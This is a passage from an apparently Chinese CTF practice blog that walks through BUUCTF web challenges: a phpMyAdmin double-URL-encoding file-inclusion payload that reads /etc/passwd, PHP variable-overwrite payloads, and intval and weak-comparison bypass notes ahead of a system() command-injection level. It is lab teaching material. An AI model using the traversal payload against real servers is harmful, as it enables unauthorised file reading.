在白名单中，但白名单为空</li><li><code>mb_strpos()</code>  方法是查找字符串在另一个字符串中首次出现的位置</li><li><code>mb_substr()</code>  方法返回字符串的一部分</li><li>也就是经过两个函数的共同处理， <code>$_page</code>  变量去除了后面的传参，只保存了文件名</li><li>也就是 <code>index.php?id=1</code>  经处理变成了 <code>index.php</code></li><li>变量 <code>$_page</code>  在白名单中，但白名单为空</li><li>变量 <code>$_page</code>  经过 <code>urldecode()</code>  方法，继续做如上操作</li><li>若都不满足，则返回 <code>false</code></li></ul><p>其中问题出现在 <code>$_page = urldecode($page);</code>  中，可以利用这个函数绕过 <code>$whitelist</code>  白名单的检测，构造 Pyaload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php?target=db_sql.php%<span class="number">253</span>f/../../../../../../../../etc/passwd</span><br></pre></td></tr></table></figure><p>也就是将在浏览器传入参数时， <code>?</code>  进行一次解码，再经过 <code>urldecode()</code>  的第两次解码后，会导致 <code>db_sql.php</code>  作为参数而绕过白名单检测，从而实现文件读取。</p><p>payload 解析：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">target=db_sql.php%253f/../</span><br></pre></td></tr></table></figure><p>首先服务器接收到该传参后进行一次 URL 解码，变成</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">target=db_sql.php%3f/../</span><br></pre></td></tr></table></figure><p>该值可以顺利的通过前 4 个条件的判断</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">! empty($_REQUEST[&#x27;target&#x27;])</span><br><span class="line">&amp;&amp; is_string($_REQUEST[&#x27;target&#x27;])</span><br><span class="line">&amp;&amp; ! preg_match(&#x27;/^index/&#x27;, $_REQUEST[&#x27;target&#x27;])</span><br><span class="line">&amp;&amp; ! in_array($_REQUEST[&#x27;target&#x27;], $target_blacklist)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>然后进入 checkPageValidity 函数，在执行   <code>if(in_array($page, $whitelist))</code>  将原生的 target 值与白名单进行匹配、 <code>if(in_array($page, $whitelist))</code>  将去掉传参的 targte 的值与白名单进行匹配  的时候均匹配失败 (前者匹配原声 target 的值，后者匹配去掉传参后的 target 的值)，于是执行 <code>if(in_array($page, $whitelist))</code> ，在这个条件中会对该值进行 URL 解码，变成了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">target=db_sql.php?/../</span><br><span class="line"><span class="comment">#%3f是?的URL编码</span></span><br></pre></td></tr></table></figure><p>解码完成之后，会去除去除传参，最终变成了 <code>target=db_sql.php</code> ，能够成功的匹配白名单。</p></blockquote><p>回到题目，这个 CVE 尝试利用，多个 <code>../</code>  是为了确保能够回到根目录，构造 payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">phpmyadmin/index.php?target=db_sql.php%253f/../../../../../../../../etc/passwd</span><br></pre></td></tr></table></figure><p>成功获取到 passwd</p><p><img src="/2024/01/27/buuctf%E5%88%B7%E9%A2%983/b19.png" class="lazyload" data-srcset="/2024/01/27/buuctf%E5%88%B7%E9%A2%983/b19.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>获取 flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">phpmyadmin/index.php?target=db_sql.php%253f/../../../../../../../../flag</span><br></pre></td></tr></table></figure><p><img src="/2024/01/27/buuctf%E5%88%B7%E9%A2%983/b20.png" class="lazyload" data-srcset="/2024/01/27/buuctf%E5%88%B7%E9%A2%983/b20.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><h2 id="bjdctf2020mark-loves-cat"><a class="markdownIt-Anchor" href="#bjdctf2020mark-loves-cat">#</a> [BJDCTF2020]Mark loves cat</h2><p>打开题目，琢磨了一番，没什么头绪，dirsearch 开扫，扫出了 <code>.git/</code> ，那应该是源码泄露，用 githack 提取出源码，怎么使用 githack 获取源码翻之前源码泄露的题目</p><p>提取出 index.php 有用的部分</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$yds</span> = <span class="string">&quot;dog&quot;</span>;</span><br><span class="line"><span class="variable">$is</span> = <span class="string">&quot;cat&quot;</span>;</span><br><span class="line"><span class="variable">$handsome</span> = <span class="string">&#x27;yds&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_POST</span> <span class="keyword">as</span> <span class="variable">$x</span> =&gt; <span class="variable">$y</span>)&#123;</span><br><span class="line">    <span class="variable">$$x</span> = <span class="variable">$y</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$x</span> =&gt; <span class="variable">$y</span>)&#123;</span><br><span class="line">    <span class="variable">$$x</span> = <span class="variable">$$y</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$x</span> =&gt; <span class="variable">$y</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>] === <span class="variable">$x</span> &amp;&amp; <span class="variable">$x</span> !== <span class="string">&#x27;flag&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="variable">$handsome</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>]) &amp;&amp; !<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="variable">$yds</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>] === <span class="string">&#x27;flag&#x27;</span>  || <span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>] === <span class="string">&#x27;flag&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="variable">$is</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;the flag is: &quot;</span>.<span class="variable">$flag</span>;</span><br></pre></td></tr></table></figure><p>代码审计：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$yds</span> = <span class="string">&quot;dog&quot;</span>;</span><br><span class="line"><span class="variable">$is</span> = <span class="string">&quot;cat&quot;</span>;</span><br><span class="line"><span class="variable">$handsome</span> = <span class="string">&#x27;yds&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// $$使用不当造成变量覆盖漏洞</span></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_POST</span> <span class="keyword">as</span> <span class="variable">$x</span> =&gt; <span class="variable">$y</span>)&#123;</span><br><span class="line">    <span class="variable">$$x</span> = <span class="variable">$y</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 比如输入 yds=flag 相当于 $yds=$flag</span></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$x</span> =&gt; <span class="variable">$y</span>)&#123;</span><br><span class="line">    <span class="variable">$$x</span> = <span class="variable">$$y</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$x</span> =&gt; <span class="variable">$y</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>] === <span class="variable">$x</span> &amp;&amp; <span class="variable">$x</span> !== <span class="string">&#x27;flag&#x27;</span>)&#123; <span class="comment">//判断get传进来的值等不等于flag，如果等于flag则跳过</span></span><br><span class="line">        <span class="keyword">exit</span>(<span class="variable">$handsome</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//当既没有通过GET方法传递flag参数，也没有通过POST方法传递flag参数时，会输出$yds。</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>]) &amp;&amp; !<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="variable">$yds</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//只要通过POST或者GET方法传递了名为flag的参数，并且该参数的值等于 &#x27;flag&#x27;，就会输出$is。</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>] === <span class="string">&#x27;flag&#x27;</span>  || <span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>] === <span class="string">&#x27;flag&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="variable">$is</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;the flag is: &quot;</span>.<span class="variable">$flag</span>;</span><br></pre></td></tr></table></figure><p>到这里可以感觉到有好几个方法能够获取 flag</p><p><strong>第一种：</strong> yds=flag</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>]) &amp;&amp; !<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="variable">$yds</span>);<span class="comment">//exit()也是可以输出的！</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>利用这段代码结合变量覆盖漏洞，把 <code>$yds</code>  和 <code>$flag</code>  两个变量联系起来</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$x</span> =&gt; <span class="variable">$y</span>)&#123;</span><br><span class="line">    <span class="variable">$$x</span> = <span class="variable">$$y</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当我们执行 get 传参的时候让 yds=flag，传进来之后通过 foreach 函数使 <code>$x=yds</code> ， <code>$y=flag</code> ，然后 <code>$$x = $$y</code>  会导致变量覆盖，可以这样理解 <code>$($x)=$($y)  $x=yds  $y=flag</code>  即 <code>$yds=$flag</code> ，至此我们可以构建一个巨简短的 payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?yds=flag</span><br></pre></td></tr></table></figure><p><img src="/2024/01/27/buuctf%E5%88%B7%E9%A2%983/b21.png" class="lazyload" data-srcset="/2024/01/27/buuctf%E5%88%B7%E9%A2%983/b21.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>网站最底部轻松找到 flag</p><p><strong>第二种：</strong> handsome=flag + 满足 if 条件</p><p>通过这段代码，实现让 handsome 和 yds 一样变量覆盖，然后满足 if 条件就好</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">foreach($_GET as $x =&gt; $y)&#123;</span><br><span class="line">    if($_GET[&#x27;flag&#x27;] === $x &amp;&amp; $x !== &#x27;flag&#x27;)&#123;</span><br><span class="line">        exit($handsome);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>满足 if 条件需要 <code>flag=a&amp;a=flag</code> ，因为 GET 方法获取参数 flag，所以是 a，在第二次遍历的时候参数 <code>$x=a</code> ，所以会有 <code>a === a &amp;&amp; a != 'flag'</code>  满足条件，输出 <code>$handsome</code> ，所以我们还需要让变量 handsome 等于变量 flag，利用变量覆盖漏洞，只需要让第一种方法的那一段代码执行后得到 <code>$handsome = $flag</code>  就好，构造 payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?handsome=flag&amp;flag=a&amp;a=flag</span><br></pre></td></tr></table></figure><p><img src="/2024/01/27/buuctf%E5%88%B7%E9%A2%983/b22.png" class="lazyload" data-srcset="/2024/01/27/buuctf%E5%88%B7%E9%A2%983/b22.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>这里还有更简便的一种 payload，看别的师傅的 wp 看到的，贴个 wp：<a href="https://www.cnblogs.com/Nestar/p/15922456.html">https://www.cnblogs.com/Nestar/p/15922456.html</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?handsome=flag&amp;flag=handsome</span><br></pre></td></tr></table></figure><p><img src="/2024/01/27/buuctf%E5%88%B7%E9%A2%983/b23.png" class="lazyload" data-srcset="/2024/01/27/buuctf%E5%88%B7%E9%A2%983/b23.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>tql</p><p><strong>第三种：</strong> 覆盖 is</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>] === <span class="string">&#x27;flag&#x27;</span>  || <span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>] === <span class="string">&#x27;flag&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="variable">$is</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这段代码就简单的不能在简单了，很好执行，只需要满足 GET 方法得到的 flag 参数等于’flag’，然后我们利用上面的变量覆盖让 <code>$is=$flag</code>  就输出 flag 了</p><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?is=flag&amp;flag=flag</span><br></pre></td></tr></table></figure><p><img src="/2024/01/27/buuctf%E5%88%B7%E9%A2%983/b24.png" class="lazyload" data-srcset="/2024/01/27/buuctf%E5%88%B7%E9%A2%983/b24.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><h2 id="wustctf2020朴实无华"><a class="markdownIt-Anchor" href="#wustctf2020朴实无华">#</a> [WUSTCTF2020] 朴实无华</h2><p>进入页面，乱码，火狐右击定制工具栏，里面有个修复文字编码，看到人间极乐 bot？</p><p><img src="/2024/01/27/buuctf%E5%88%B7%E9%A2%983/b27.png" class="lazyload" data-srcset="/2024/01/27/buuctf%E5%88%B7%E9%A2%983/b27.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>看到 bot 就想到 robots，尝试访问一下 robots.txt，好嘛确实有东西，不过一眼假。。。</p><p><img src="/2024/01/27/buuctf%E5%88%B7%E9%A2%983/b28.png" class="lazyload" data-srcset="/2024/01/27/buuctf%E5%88%B7%E9%A2%983/b28.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>没办法也没别的东西只能访问看看</p><p><img src="/2024/01/27/buuctf%E5%88%B7%E9%A2%983/b29.png" class="lazyload" data-srcset="/2024/01/27/buuctf%E5%88%B7%E9%A2%983/b29.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>额。。。但是在查看 header 的时候有意外发现</p><p><img src="/2024/01/27/buuctf%E5%88%B7%E9%A2%983/b30.png" class="lazyload" data-srcset="/2024/01/27/buuctf%E5%88%B7%E9%A2%983/b30.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>响应头里有个 <code>Look_at_me: /fl4g.php</code>  访问一下</p><p>这大图这乱码。。。文字修复一下得到代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-type:text/html;charset=utf-8&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(__file__);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//level 1</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>) &lt; <span class="number">2020</span> &amp;&amp; <span class="title function_ invoke__">intval</span>(<span class="variable">$num</span> + <span class="number">1</span>) &gt; <span class="number">2021</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;我不经意间看了看我的劳力士, 不是想看时间, 只是想不经意间, 让你知道我过得比你好.&lt;/br&gt;&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;金钱解决不了穷人的本质问题&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;去非洲吧&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//level 2</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;md5&#x27;</span>]))&#123;</span><br><span class="line">   <span class="variable">$md5</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;md5&#x27;</span>];</span><br><span class="line">   <span class="keyword">if</span> (<span class="variable">$md5</span>==<span class="title function_ invoke__">md5</span>(<span class="variable">$md5</span>))</span><br><span class="line">       <span class="keyword">echo</span> <span class="string">&quot;想到这个CTFer拿到flag后, 感激涕零, 跑去东澜岸, 找一家餐厅, 把厨师轰出去, 自己炒两个拿手小菜, 倒一杯散装白酒, 致富有道, 别学小暴.&lt;/br&gt;&quot;</span>;</span><br><span class="line">   <span class="keyword">else</span></span><br><span class="line">       <span class="keyword">die</span>(<span class="string">&quot;我赶紧喊来我的酒肉朋友, 他打了个电话, 把他一家安排到了非洲&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;去非洲吧&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//get flag</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;get_flag&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$get_flag</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;get_flag&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">strstr</span>(<span class="variable">$get_flag</span>,<span class="string">&quot; &quot;</span>))&#123;</span><br><span class="line">        <span class="variable">$get_flag</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&quot;cat&quot;</span>, <span class="string">&quot;wctf2020&quot;</span>, <span class="variable">$get_flag</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;想到这里, 我充实而欣慰, 有钱人的快乐往往就是这么的朴实无华, 且枯燥.&lt;/br&gt;&quot;</span>;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$get_flag</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;快到非洲了&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;去非洲吧&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>代码审计：</p><p>level1 是绕过 intval 函数</p><p>level2 是 md5 弱类型比较</p><p>level3 首先是 <code>strstr</code>  函数对空格的限制，传入的时候就不能有空格，然后是 <code>str_ireplace</code>  函数把 cat 替换成 wctf2020，然后传入的 get_flag 会被 <code>system</code>  当作系统命令执行</p><p>ok 一层一层来吧，先来 level1</p><p>这里记录一下 intval 函数和绕过方法，学习链接 https://blog.csdn.net/wangyuxiang946/article/details/131156104</p><p><code>intval()</code>  函数可以获取变量的<strong>整数值</strong>。常用于强制类型转换。</p><p>语法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">int intval( $var, $base )</span><br></pre></td></tr></table></figure><p>参数：</p><ul><li>$var：需要转换成 integer 的<strong>变量</strong></li><li>$base：转换所使用的<strong>进制</strong></li></ul><p>integer 是集合 ℤ = {…, -2, -1, 0, 1, 2, …} 中的某个数。</p><p>返回值：</p><p>返回值为 integer 型，可能是 0 或者 1 或者其他</p><ul><li>0：失败或者空 array 返回 0</li><li>1：非空 array 返回 1</li><li>其他 integer 值：成功返回 <code>$var</code>  的 integer 值。</li></ul><p>返回值的<strong>最大值</strong>取决于系统</p><ul><li>32 位系统（-2147483648 到 2147483647）</li><li>64 位系统（-9223372036854775808 到 9223372036854775807）</li></ul><p>有几个有用的功能介绍一下吧：</p><p>1、进制自动转换</p><p>第二个参数 $base 允许为空。</p><p>当 base 为空时，默认值是 0，会根据 $var 的格式来调整转换的进制。</p><ul><li>如果 $var 以 0 开头，就使用 8 进制</li><li>如果 $var 以 0x 开头，就使用 16 进制</li><li>其他就使用 10 进制</li></ul><p>2、转换小数</p><p>intval () 转换小数类型时，只返回个位数，不遵循四舍五入的原则。</p><p>3、取反～</p><p>intval () 函数支持一些<a href="https://so.csdn.net/so/search?q=%E7%89%B9%E6%AE%8A%E7%AC%A6%E5%8F%B7&amp;spm=1001.2101.3001.7020">特殊符号</a>的，比如 <code>~</code>  取反。</p><p><strong>实例：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">intval</span>(~<span class="number">10</span>));</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">intval</span>(~~<span class="number">10</span>));</span><br></pre></td></tr></table></figure><p>输出：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">int(-11)</span><br><span class="line">int(10)</span><br></pre></td></tr></table></figure><p>绕过思路：当某个数字被过滤时，可以两次取反来绕过。</p><blockquote><p>intval () 绕过思路（与本题无关为了拓展记录）</p><p>1）当某个数字被过滤时，可以使用它的 8 进制 / 16 进制来绕过；比如过滤 10，就用 012（八进制）或 0xA（十六进制）。</p><p>2）对于弱比较（a==b），可以给 a、b 两个参数传入空数组，使弱比较为 true。</p><p>3）当某个数字被过滤时，可以给它增加小数位来绕过；比如过滤 3，就用 3.1。</p><p>4）当某个数字被过滤时，可以给它拼接字符串来绕过；比如过滤 3，就用 3ab。（GET 请求的参数会自动拼接单引号）</p><p>5）当某个数字被过滤时，可以两次取反来绕过；比如过滤 10，就用～～10。</p><p>6）当某个数字被过滤时，可以使用算数运算符绕过；比如过滤 10，就用 5+5 或 2*5。</p></blockquote><p>学习链接：<a href="https://blog.csdn.net/qq_44879989/article/details/133418606">https://blog.csdn.net/qq_44879989/article/details/133418606</a></p><p>本题 intval 的绕过和<strong>科学计数法</strong>息息相关，这里直接实例来看看 intval 函数遇到科学计数法会怎么样，但是 intval () 在不同 PHP 版本中表现是有差异的，在 <code>PHP7.4.3</code>  中的表现</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">intval</span>(<span class="string">&#x27;1e10&#x27;</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">intval</span>(<span class="string">&#x27;3.1415926e5&#x27;</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">intval</span>(<span class="string">&#x27;8724e-2&#x27;</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/2024/01/27/buuctf%E5%88%B7%E9%A2%983/b31.png" class="lazyload" data-srcset="/2024/01/27/buuctf%E5%88%B7%E9%A2%983/b31.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>从结果来看，是可以正常解读科学计数法的，那我切换成 <code>PHP5.3.29</code>  尝试一下，同样的代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 